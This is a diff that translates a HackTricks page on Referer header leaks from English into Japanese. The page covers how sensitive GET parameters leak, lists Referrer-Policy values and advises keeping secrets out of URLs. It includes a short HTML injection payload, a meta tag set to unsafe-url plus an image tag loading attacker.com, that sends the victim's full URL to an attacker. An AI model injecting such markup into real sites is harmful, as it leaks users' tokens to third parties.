@@ -1,17 +1,16 @@
 {{#include ../banners/hacktricks-training.md}}
 
-# Referrer headers and policy
+# リファラーヘッダーとポリシー
 
-Referrer is the header used by browsers to indicate which was the previous page visited.
+リファラーは、ブラウザが前に訪れたページを示すために使用するヘッダーです。
 
-## Sensitive information leaked
+## 機密情報の漏洩
 
-If at some point inside a web page any sensitive information is located on a GET request parameters, if the page contains links to external sources or an attacker is able to make/suggest (social engineering) the user visit a URL controlled by the attacker. It could be able to exfiltrate the sensitive information inside the latest GET request.
+ウェブページ内のどこかに機密情報がGETリクエストパラメータに存在する場合、そのページが外部ソースへのリンクを含んでいるか、攻撃者がユーザーに攻撃者が制御するURLを訪問させることができる（ソーシャルエンジニアリング）場合、最新のGETリクエスト内の機密情報を抽出できる可能性があります。
 
-## Mitigation
+## 緩和策
 
-You can make the browser follow a **Referrer-policy** that could **avoid** the sensitive information to be sent to other web applications:
-
+ブラウザに**リファラーポリシー**に従わせることで、機密情報が他のウェブアプリケーションに送信されるのを**回避**することができます：
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -22,19 +21,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
+## カウンター緩和
 
-## Counter-Mitigation
-
-You can override this rule using an HTML meta tag (the attacker needs to exploit and HTML injection):
-
+このルールはHTMLメタタグを使用して上書きできます（攻撃者はHTMLインジェクションを悪用する必要があります）：
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
+## 防御
 
-## Defense
-
-Never put any sensitive data inside GET parameters or paths in the URL.
+決してGETパラメータやURLのパスに機密データを入れないでください。
 
 {{#include ../banners/hacktricks-training.md}}
-
